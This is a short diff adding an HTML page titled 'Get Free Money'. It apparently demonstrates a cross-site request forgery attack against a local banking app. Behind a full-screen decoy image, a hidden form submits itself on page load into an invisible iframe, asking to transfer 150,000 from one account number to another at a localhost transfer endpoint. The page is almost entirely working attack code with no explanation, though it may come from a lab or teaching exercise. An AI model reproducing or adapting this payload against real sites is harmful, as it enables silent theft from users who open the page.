@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Get Free Money</title>
+</head>
+<body>
+    <img src="money-background.jpg" style="position: fixed;top: 0;left: 0;min-width: 100%;min-height: 100%" alt="" />
+    <iframe style="display:none" name="csrf-frame"></iframe>
+    <form style="display: none;" target="csrf-frame" action="http://localhost:8000/transfer/" method="post" id="transfer-form">
+        <input type="number" value="1000568" name="from_account" />
+        <input type="number" value="1000567" name="to_account" />
+        <input type="number" value="150000" name="sum" />
+    </form>
+    <script>
+        document.getElementById("transfer-form").submit()
+    </script>
+</body>
+</html>
